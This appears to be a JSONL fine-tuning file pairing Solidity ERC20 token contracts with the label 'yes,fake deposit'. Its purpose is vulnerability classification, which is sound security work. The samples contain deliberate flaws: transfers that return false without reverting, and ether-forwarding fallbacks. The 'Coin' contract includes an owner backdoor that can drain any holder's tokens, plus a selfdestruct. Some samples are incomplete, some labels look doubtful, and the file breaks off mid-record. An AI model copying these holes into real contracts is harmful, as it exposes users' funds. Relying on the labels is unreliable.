{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 1000000000; // Update total supply (100000 for example)\n name = \"clown.finance\"; // Set the name for display purposes\n decimals = 0; // Amount of decimals for display purposes\n symbol = \"CLOWN\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\n\nabstract contract ERC20Basic {\n uint256 public _totalSupply = 100000000000000000000000000; //100 000 000\n function totalSupply() public virtual view returns (uint256);\n function balanceOf(address who) public virtual view returns (uint256);\n function transfer(address to, uint256 value) public virtual returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\n\n\nabstract contract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public virtual view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public virtual returns (bool);\n function approve(address spender, uint256 value) public virtual returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n\ncontract Ownable {\n\n // Owner address of contract. Assigned on deployment.\n address payable public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n constructor() {\n owner = payable(msg.sender);\n }\n\n \n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n\n \n function transferOwnership(address payable newOwner) onlyOwner public {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\n\n\n\n\nabstract contract StandardToken is ERC20, Ownable {\n // Addresses and balances (in tokens) of all clients. Required by ERC20.\n mapping (address => uint256) balances;\n // Clients, allowed to work. Required by ERC20.\n mapping (address => mapping (address => uint256)) allowed;\n \n function totalSupply() public override view returns (uint256) {\n return _totalSupply;\n }\n \n function transfer(address _to, uint256 _value) override public returns (bool success) {\n if (balances[msg.sender] >= _value\n && _value > 0\n && balances[_to] + _value > balances[_to])\n {\n uint256 obalance = balances[msg.sender];\n if ( obalance >= _value)\n {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n else\n {\n return false;\n }\n }\n else\n {\n return false;\n }\n }\n\n function balanceOf(address _owner) public override view returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) public override returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public override view returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n}\n\n\ncontract Coin is StandardToken {\n // A symbol of a coin.\n string public constant symbol = \"EXTRA\";\n // A name of a coin.\n string public constant name = \"ExtraToken\";\n // A number of decimals in a coin.\n uint8 public constant decimals = 18;\n \n event TransferFromTo(address indexed _from, address indexed _to, address indexed _by, uint256 _value);\n\n \n constructor() payable {\n owner = payable(msg.sender);\n balances[owner] = _totalSupply;\n emit Transfer(address(this), owner, _totalSupply);\n }\n\n \n function kill() public onlyOwner {\n selfdestruct(owner);\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public override returns (bool success) {\n if (msg.sender == owner) {\n allowed[_from][msg.sender] = _value;\n }\n\n if (balances[_from] >= _value\n && allowed[_from][msg.sender] >= _value\n && _value > 0)\n {\n uint256 obalance = balances[_from];\n if ( obalance >= _value)\n {\n\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n balances[_to] += _value;\n emit Transfer(_from, _to, _value);\n emit TransferFromTo(_from, _to, msg.sender, _value);\n return true;\n }\n else\n {\n return false;\n }\n }\n else\n\t\t{\n return false;\n }\n }\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\n\n\n\n\n\n\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n\n function transfer(address to, uint value) public returns (bool ok);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract VoltNFT is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 20000000*10**uint256(decimals);\n\n string public constant name = \"VoltNFT\";\n string public constant symbol = \"VOLTY\";\n\n address payable teamAddress;\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n\n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract ERC20Token is StandardToken {\n\n function () {\n throw;\n }\n\n \n string public name; \n uint8 public decimals; \n string public symbol; \n string public version = 'H1.0'; \n\n function ERC20Token(\n ) {\n balances[msg.sender] = 666666666000000000000000000; \n totalSupply = 1000000000000000000000000000; \n name = \"SISURI - THE Moral AI\"; \n decimals = 18; \n symbol = \"MORAL\"; \n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n \n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//SPDX-License-Identifier: Unlicensed\n\n\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract Tokenplace is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 250000000*10**uint256(decimals);\n string public constant name = \"Tokenplace\";\n string public constant symbol = \"TOK\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract Tracer is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name = 'Tracer'; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol = 'TCR'; //An identifier: eg SBX\n string public version = '0.0.1'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function Tracer(\n ) {\n balances[msg.sender] = 2000000000000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 2000000000000000000000000; // Update total supply (100000 for example)\n name = \"Tracer\"; // Set the name for display purposes\n decimals = 18; // Amount of decimals for display purposes\n symbol = \"TCR\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract InuHedgehog is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Inu Hedgehog\";\n string public constant symbol = \"INUH \ud83e\udd94\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.6.12;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address payable) {\n return msg.sender;\n }\n\n function _msgData() internal view virtual returns (bytes memory) {\n this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n return msg.data;\n }\n}\n\n\n\ncontract KIGGAL is Context, IBEP20, Ownable {\n using SafeMath for uint256;\n using Address for address;\n\n mapping (address => uint256) private _rOwned;\n mapping (address => uint256) private _tOwned;\n mapping (address => mapping (address => uint256)) private _allowances;\n \n mapping (address => bool) private _isSniper;\n\n mapping (address => bool) private _isExcludedFromFee;\n\n mapping (address => bool) private _isExcluded;\n address[] private _excluded;\n \n mapping(address => bool) private _whiteList;\n\n uint256 private constant MAX = ~uint256(0);\n uint256 private _tTotal = 1000000 * 10**9 * 10**9; \n uint256 private _rTotal = (MAX - (MAX % _tTotal));\n uint256 private _tFeeTotal;\n \n uint256 public launchTime;\n bool public tradingOpen = false;\n\n string private _name = \"KIGGAL\";\n string private _symbol = \"KIGGAL\";\n uint8 private _decimals = 9;\n\n\n uint256 public _taxFee = 10;\n uint256 private _previousTaxFee = _taxFee;\n\n uint256 public _maxTxAmount = 1000000 * 10**9 * 10**9;\n\n\n constructor () public {\n _rOwned[_msgSender()] = _rTotal;\n\n _isExcludedFromFee[owner()] = true;\n _isExcludedFromFee[address(this)] = true;\n \n emit Transfer(address(0), _msgSender(), _tTotal);\n }\n \n function openTrading() external onlyOwner() {\n tradingOpen = true;\n launchTime = block.timestamp;\n }\n \n function addToWhiteList(address account) external onlyOwner() {\n require(!_whiteList[account], \"Account is already in whiteList\");\n _whiteList[account] = true;\n }\n \n function addListToWhiteList(address[] calldata accountList) external onlyOwner() {\n require(accountList.length > 0, \"No account found\");\n for (uint256 i = 0; i < accountList.length; i++) {\n if (!_whiteList[accountList[i]]) {\n _whiteList[accountList[i]] = true; \n }\n }\n }\n\n function removeFromWhiteList(address account) external onlyOwner() {\n require(_whiteList[account], \"Account is not in whiteList\");\n _whiteList[account] = false;\n }\n \n function removeListFromWhiteList(address[] calldata accountList) external onlyOwner() {\n require(accountList.length > 0, \"No account found\");\n for (uint256 i = 0; i < accountList.length; i++) {\n if (_whiteList[accountList[i]]) {\n _whiteList[accountList[i]] = false; \n }\n }\n }\n\n function name() public view returns (string memory) {\n return _name;\n }\n\n function symbol() public view returns (string memory) {\n return _symbol;\n }\n\n function decimals() public view returns (uint8) {\n return _decimals;\n }\n\n function totalSupply() public view override returns (uint256) {\n return _tTotal;\n }\n\n function balanceOf(address account) public view override returns (uint256) {\n if (_isExcluded[account]) return _tOwned[account];\n return tokenFromReflection(_rOwned[account]);\n }\n\n function transfer(address recipient, uint256 amount) public override returns (bool) {\n _transfer(_msgSender(), recipient, amount);\n return true;\n }\n\n function allowance(address owner, address spender) public view override returns (uint256) {\n return _allowances[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public override returns (bool) {\n _approve(_msgSender(), spender, amount);\n return true;\n }\n\n function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\n _transfer(sender, recipient, amount);\n _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"BEP20: transfer amount exceeds allowance\"));\n return true;\n }\n\n\n function _approve(address owner, address spender, uint256 amount) private {\n require(owner != address(0), \"BEP20: approve from the zero address\");\n require(spender != address(0), \"BEP20: approve to the zero address\");\n\n _allowances[owner][spender] = amount;\n emit Approval(owner, spender, amount);\n }\n\n function _transfer(\n address from,\n address to,\n uint256 amount\n ) private {\n require(from != address(0), \"BEP20: transfer from the zero address\");\n require(to != address(0), \"BEP20: transfer to the zero address\");\n require(amount > 0, \"Transfer amount must be greater than zero\");\n require(!_isSniper[to], \"You have no power here!\");\n require(!_isSniper[msg.sender], \"You have no power here!\");\n if(from != owner() && to != owner() && !_whiteList[from] && !_whiteList[to]) {\n require(amount <= _maxTxAmount, \"Transfer amount exceeds the maxTxAmount.\");\n if (!tradingOpen) {\n if (!(from == address(this) || to == address(this)\n || from == address(owner()) || to == address(owner()))) {\n require(tradingOpen, \"Trading is not enabled\");\n }\n }\n }\n \n \n \n if(from != owner() && to != owner()) {\n require(amount <= _maxTxAmount, \"Transfer amount exceeds the maxTxAmount.\");\n }\n\n bool takeFee = true;\n\n //if any account belongs to _isExcludedFromFee account then remove the fee\n if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){\n takeFee = false;\n }\n\n _tokenTransfer(from,to,amount,takeFee);\n }\n\n}\n\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.6.12;\npragma experimental ABIEncoderV2;\n\ncontract Domain {\n\n constructor() public {\n uint256 chainId;\n assembly {\n chainId := chainid()\n }\n _DOMAIN_SEPARATOR = _calculateDomainSeparator(DOMAIN_SEPARATOR_CHAIN_ID = chainId);\n }\n\n function _domainSeparator() internal view returns (bytes32) {\n uint256 chainId;\n assembly {\n chainId := chainid()\n }\n return chainId == DOMAIN_SEPARATOR_CHAIN_ID ? _DOMAIN_SEPARATOR : _calculateDomainSeparator(chainId);\n }\n\n function _getDigest(bytes32 dataHash) internal view returns (bytes32 digest) {\n digest = keccak256(abi.encodePacked(EIP191_PREFIX_FOR_EIP712_STRUCTURED_DATA, _domainSeparator(), dataHash));\n }\n}\n\n\ncontract ERC20Data {\n /// @notice owner > balance mapping.\n mapping(address => uint256) public balanceOf;\n /// @notice owner > spender > allowance mapping.\n mapping(address => mapping(address => uint256)) public allowance;\n /// @notice owner > nonce mapping. Used in `permit`.\n mapping(address => uint256) public nonces;\n}\n\ncontract ERC20 is ERC20Data, Domain {\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n function transfer(address to, uint256 amount) public returns (bool) {\n // If `amount` is 0, or `msg.sender` is `to` nothing happens\n if (amount != 0) {\n uint256 srcBalance = balanceOf[msg.sender];\n require(srcBalance >= amount, \"ERC20: balance too low\");\n if (msg.sender != to) {\n require(to != address(0), \"ERC20: no zero address\"); // Moved down so low balance calls safe some gas\n\n balanceOf[msg.sender] = srcBalance - amount; // Underflow is checked\n balanceOf[to] += amount; // Can't overflow because totalSupply would be greater than 2^256-1\n }\n }\n emit Transfer(msg.sender, to, amount);\n return true;\n }\n\n function transferFrom(\n address from,\n address to,\n uint256 amount\n ) public returns (bool) {\n // If `amount` is 0, or `from` is `to` nothing happens\n if (amount != 0) {\n uint256 srcBalance = balanceOf[from];\n require(srcBalance >= amount, \"ERC20: balance too low\");\n\n if (from != to) {\n uint256 spenderAllowance = allowance[from][msg.sender];\n // If allowance is infinite, don't decrease it to save on gas (breaks with EIP-20).\n if (spenderAllowance != type(uint256).max) {\n require(spenderAllowance >= amount, \"ERC20: allowance too low\");\n allowance[from][msg.sender] = spenderAllowance - amount; // Underflow is checked\n }\n require(to != address(0), \"ERC20: no zero address\"); // Moved down so other failed calls safe some gas\n\n balanceOf[from] = srcBalance - amount; // Underflow is checked\n balanceOf[to] += amount; // Can't overflow because totalSupply would be greater than 2^256-1\n }\n }\n emit Transfer(from, to, amount);\n return true;\n }\n\n function approve(address spender, uint256 amount) public returns (bool) {\n allowance[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true;\n }\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.3;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"./ScheduleCalc.sol\";\n\n\ninterface IERC20Burnable is IERC20 {\n function burn(uint256 amount) external;\n\n function decimals() external view returns (uint8);\n}\n\ncontract TokenLockup {\n IERC20Burnable public token;\n string private _name;\n string private _symbol;\n\n ReleaseSchedule[] public releaseSchedules;\n uint public minReleaseScheduleAmount;\n uint public maxReleaseDelay;\n\n mapping(address => Timelock[]) public timelocks;\n mapping(address => uint) internal _totalTokensUnlocked;\n mapping(address => mapping(address => uint)) internal _allowances;\n\n event Approval(address indexed from, address indexed spender, uint amount);\n event TimelockBurned(address indexed from, uint timelockId);\n event ScheduleCreated(address indexed from, uint scheduleId);\n event ScheduleFunded(address indexed from, address indexed to, uint indexed scheduleId, uint amount, uint commencementTimestamp, uint timelockId);\n\n constructor (\n address _token,\n string memory name_,\n string memory symbol_,\n uint _minReleaseScheduleAmount,\n uint _maxReleaseDelay\n ) {\n _name = name_;\n _symbol = symbol_;\n token = IERC20Burnable(_token);\n\n require(_minReleaseScheduleAmount > 0, \"Min schedule amount > 0\");\n minReleaseScheduleAmount = _minReleaseScheduleAmount;\n maxReleaseDelay = _maxReleaseDelay;\n }\n\n function balanceOf(address who) external view returns (uint) {\n return unlockedBalanceOf(who) + lockedBalanceOf(who);\n }\n\n function transfer(address to, uint value) external returns (bool) {\n return _transfer(msg.sender, to, value);\n }\n\n function transferFrom(address from, address to, uint value) external returns (bool) {\n require(_allowances[from][msg.sender] >= value, \"value > allowance\");\n _allowances[from][msg.sender] -= value;\n return _transfer(from, to, value);\n }\n\n // Code from OpenZeppelin's contract/token/ERC20/ERC20.sol, modified\n function approve(address spender, uint amount) external returns (bool) {\n _approve(msg.sender, spender, amount);\n return true;\n }\n\n // Code from OpenZeppelin's contract/token/ERC20/ERC20.sol, modified\n function allowance(address owner, address spender) public view returns (uint256) {\n return _allowances[owner][spender];\n }\n\n // Code from OpenZeppelin's contract/token/ERC20/ERC20.sol, modified\n function increaseAllowance(address spender, uint addedValue) external returns (bool) {\n _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);\n return true;\n }\n\n // Code from OpenZeppelin's contract/token/ERC20/ERC20.sol, modified\n function decreaseAllowance(address spender, uint subtractedValue) external returns (bool) {\n uint currentAllowance = 